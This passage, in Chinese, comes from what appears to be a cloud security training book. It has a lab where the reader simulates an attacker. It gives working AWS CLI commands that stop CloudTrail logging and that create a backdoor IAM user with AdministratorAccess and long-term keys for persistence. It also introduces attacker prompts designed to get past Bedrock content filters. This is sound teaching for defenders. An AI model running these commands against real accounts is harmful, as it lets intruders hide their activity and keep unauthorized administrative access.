

```
{
    "Trail": {
        "Name": "all-events",
        "S3BucketName": "aws-cloudtrail-logs-...",
        "IncludeGlobalServiceEvents": true,
        "IsMultiRegionTrail": true,
        "HomeRegion": "us-east-1",
        "TrailARN": "...",
        "LogFileValidationEnabled": true,
        "KmsKeyId": "...",
        "HasCustomEventSelectors": true,
        "HasInsightSelectors": true,
        "IsOrganizationTrail": false
    }
}
```

### 3. 检查 `all-events` trail 的当前配置和状态：

```
aws cloudtrail get-trail-status \
    --name all-events \
    --region us-east-1 \
    --profile target-account
```

以下响应确认 `all-events` trail 正在你的 AWS 账户中主动记录事件：

```
{
    "IsLogging": true,
    "LatestDeliveryTime": "...",
    "StartLoggingTime": "...",
    "LatestDigestDeliveryTime": "...",
    "LatestDeliveryAttemptTime": "...",
    "LatestNotificationAttemptTime": "",
    "LatestNotificationAttemptSucceeded": "",
    "LatestDeliveryAttemptSucceeded": "...",
    "TimeLoggingStarted": "...",
    "TimeLoggingStopped": ""
}
```

### 4. 要关闭 `all-events` trail 的日志记录，请运行以下命令：^([28](#ch04.html#id594))

```
aws cloudtrail stop-logging \
    --name all-events \
    --region us-east-1 \
    --profile target-account
```

###### Note

攻击者可能会利用一个脚本遍历所有 AWS 区域，列出每个区域中的所有 CloudTrail trail，并以编程方式停止日志记录。

此时，你应该意识到过度宽松的 IAM 配置对 CloudTrail 日志的完整性构成了严重威胁。任何与具有这些权限的角色或用户关联的凭据集都可被轻易用于禁用日志记录——使安全团队更难跟踪可疑活动或分析安全事件。^([29](#ch04.html#id597))

# 使用管理员权限创建后门 IAM 用户

在获得访问权限并入侵云账户后，攻击者通常旨在建立持久性以维持长期访问并可能逃避检测。所使用的方法各不相同，从创建 IAM 用户到部署后门 Lambda 函数版本。在本节中，你将模拟创建后门 IAM 用户以建立长期访问。即使当前的一组漏洞和错误配置得到修复，只要未明确撤销或删除，该后门 IAM 用户仍可能被攻击者利用以获得对账户的未经授权访问。

这种方法就像入侵者通过复制门禁卡或贿赂员工来在建筑物内部创建隐藏入口以获得持久访问权限。入侵者即使在原始访问控制更新后仍可返回并使用门禁卡。

###### Note

本节假设你正在使用攻击者账户来模拟攻击者尝试利用无服务器实验室环境中的资源。

让我们模拟攻击者可能采取的步骤，通过新的 IAM 用户维持长期访问：

1. 创建一个用户名为 `super-admin-user-2` 的新 IAM 用户：

```
NEW_IAM_USER=super-admin-user-2
aws iam create-user --user-name $NEW_IAM_USER --profile target-account
```

2. 为新的 IAM 用户设置登录密码：

```
PASSWORD="[SPECIFY PASSWORD]"
```

```
aws iam create-login-profile \
  --user-name $NEW_IAM_USER \
  --password $PASSWORD \
  --no-password-reset-required \
  --profile target-account
```

请确保将 `[SPECIFY PASSWORD]` 替换为符合 AWS 账户 [密码策略](https://oreil.ly/HRpJW) 的密码。

3. 将 `AdministratorAccess` 策略附加到新的 IAM 用户：

```
aws iam attach-user-policy \
  --user-name $NEW_IAM_USER \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess \
  --profile target-account
```

4. 为你刚刚创建的新 IAM 用户生成访问凭证：

```
aws iam create-access-key \
    --user-name $NEW_IAM_USER \
    --profile target-account
```

这会返回包含 `super-admin-user-2` 访问凭证的 JSON 响应：

```
{
    "AccessKey": {
        "UserName": "super-admin-user-2",
        "AccessKeyId": "...",
        "Status": "Active",
        "SecretAccessKey": "...",
        "CreateDate": "..."
    }
}
```

###### Caution

请务必在继续下一步之前复制 `AccessKeyId` 和 `SecretAccessKey` 值并安全地存储在本地机器中。^([30](#ch04.html#id598)) 在任何情况下都不要共享这些值，因为它们是与具有 `AdministratorAccess` 的 IAM 用户关联的长期凭证。

5. 使用上一步获得的凭证为新用户配置一个命名配置文件：

```
aws configure --profile $NEW_IAM_USER
```

6. 通过检查调用者身份验证新配置文件是否正常工作：

```
aws sts get-caller-identity --profile $NEW_IAM_USER
```

以下响应表明 CLI 正在成功使用与 `super-admin-user-2` 关联的访问密钥：

```
{
    "UserId": "*********************",
    "Account": "************",
    "Arn": "arn:aws:iam::************:user/super-admin-user-2"
}
```

7. 检查新的 IAM 用户是否允许执行关键管理操作：

```
POLICY_ARN=$(aws sts get-caller-identity \
  --profile $NEW_IAM_USER | jq -r ".Arn")

ACTIONS='iam:CreateAccessKey,iam:AttachUserPolicy,sts:AssumeRole'
aws iam simulate-principal-policy \
    --policy-source-arn $POLICY_ARN \
    --action-names $ACTIONS \
    --profile $NEW_IAM_USER
```

以下响应应验证基于附加的 `AdministratorAccess` 策略，指定的操作对 IAM 用户是允许的：

```
{
    "EvaluationResults": [
        {
            "EvalActionName": "...",
            "EvalResourceName": "*",
            "EvalDecision": "allowed",
            "MatchedStatements": [
                {
                    "SourcePolicyId": "AdministratorAccess",
                    "SourcePolicyType": "IAM Policy",
                    ...
                }
            ],
            "MissingContextValues": []
        }
    ]
}
```

有了这个，即使初始凭据已被撤销或轮换，新的 IAM 用户的凭据仍可用于通过 AWS 管理控制台或 CLI 执行特权操作。请记住，任何审计账户中 IAM 用户的人员很可能会发现有新用户被创建。也就是说，还可以使用其他不太明显的持久性技术，而不涉及创建新的 IAM 用户。我们将在后续章节中介绍这一点。

# 模拟从攻击者账户进行未经授权的 Bedrock 模型调用

一旦攻击者获得有效的 AWS 凭证，他们就可以绕过 Web 界面，直接通过 AWS CLI 或 SDK 调用 Bedrock 模型。这使他们能够以编程方式检索模型输出，甚至运行一个使用被盗凭证的 rogue 网站，将未经授权的模型请求伪装成合法流量。

在本节中，你将模拟攻击者使用被盗凭证通过 CLI 直接调用 Bedrock 模型。此外，你还将研究攻击者如何设计和发送旨在绕过默认内容过滤器的恶意提示。

###### Note

本节假设你正在使用攻击者账户来模拟攻击者尝试利用无服务器实验室环境中的资源。

